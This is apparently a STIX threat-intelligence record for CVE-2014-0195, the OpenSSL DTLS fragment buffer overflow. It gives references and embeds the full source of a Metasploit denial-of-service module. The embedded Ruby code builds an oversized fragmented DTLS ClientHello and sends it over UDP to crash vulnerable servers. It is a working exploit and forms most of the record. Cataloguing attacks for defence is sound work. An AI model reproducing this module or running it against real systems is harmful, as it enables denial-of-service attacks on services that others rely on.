{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--117a9902-2937-4302-8461-b0925b5ad386",
    "created": "2024-08-14T16:25:52.510959Z",
    "modified": "2024-08-14T16:25:52.510963Z",
    "name": "OpenSSL DTLS Fragment Buffer Overflow DoS",
    "description": " This module performs a Denial of Service Attack against Datagram TLS in OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h. This occurs when a DTLS ClientHello message has multiple fragments and the fragment lengths of later fragments are larger than that of the first, a buffer overflow occurs, causing a DoS. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/ssl/dtls_fragment_overflow.rb",
            "external_id": "dtls_fragment_overflow.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-0195"
        },
        {
            "source_name": "reference",
            "url": "http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/ZDI-14-173-CVE-2014-0195-OpenSSL-DTLS-Fragment-Out-of-Bounds/ba-p/6501002"
        },
        {
            "source_name": "reference",
            "url": "http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/Once-Bled-Twice-Shy-OpenSSL-CVE-2014-0195/ba-p/6501048"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Auxiliary::Dos\n  include Exploit::Remote::Udp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'OpenSSL DTLS Fragment Buffer Overflow DoS',\n      'Description' => %q{\n        This module performs a Denial of Service Attack against Datagram TLS in\n        OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h.\n        This occurs when a DTLS ClientHello message has multiple fragments and the\n        fragment lengths of later fragments are larger than that of the first, a\n        buffer overflow occurs, causing a DoS.\n      },\n      'Author'  =>\n        [\n          'Juri Aedla <asd[at]ut.ee>', # Vulnerability discovery\n          'Jon Hart <jon_hart[at]rapid7.com>' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          ['CVE', '2014-0195'],\n          ['ZDI', '14-173'],\n          ['BID', '67900'],\n          ['URL', 'http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/ZDI-14-173-CVE-2014-0195-OpenSSL-DTLS-Fragment-Out-of-Bounds/ba-p/6501002'],\n          ['URL', 'http://h30499.www3.hp.com/t5/HP-Security-Research-Blog/Once-Bled-Twice-Shy-OpenSSL-CVE-2014-0195/ba-p/6501048']\n        ],\n      'DisclosureDate' => '2014-06-05'))\n\n    register_options([\n      Opt::RPORT(4433),\n      OptInt.new('VERSION', [true,  \"SSl/TLS version\", 0xFEFF])\n    ])\n\n  end\n\n  def build_tls_fragment(type, length, seq, frag_offset, frag_length, frag_body=nil)\n    # format is: type (1 byte), total length (3 bytes), sequence # (2 bytes),\n    # fragment offset (3 bytes), fragment length (3 bytes), fragment body\n    sol = (seq << 48) | (frag_offset << 24) | frag_length\n    [\n      (type << 24) | length,\n      (sol >> 32),\n      (sol & 0x00000000FFFFFFFF)\n    ].pack(\"NNN\") + frag_body\n  end\n\n  def build_tls_message(type, version, epoch, sequence, message)\n    # format is: type (1 byte), version (2 bytes), epoch # (2 bytes),\n    # sequence # (6 bytes) + message length (2 bytes), message body\n    es = (epoch << 48) | sequence\n    [\n      type,\n      version,\n      (es >> 32),\n      (es & 0x00000000FFFFFFFF),\n      message.length\n    ].pack(\"CnNNn\") + message\n  end\n\n  def run\n    # add a small fragment\n    fragments = build_tls_fragment(1, 2, 0, 0, 1, 'C')\n    # add a large fragment where the length is significantly larger than that of the first\n    # TODO: you'll need to tweak the 2nd, 5th and 6th arguments to trigger the condition in some situations\n    fragments << build_tls_fragment(1, 1234, 0, 0, 123, Rex::Text.rand_text_alpha(1234))\n    message = build_tls_message(22, datastore['VERSION'], 0, 0, fragments)\n    connect_udp\n    print_status(\"#{rhost}:#{rport} - Sending fragmented DTLS client hello packet\")\n    udp_sock.put(message)\n    disconnect_udp\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-06-05"
}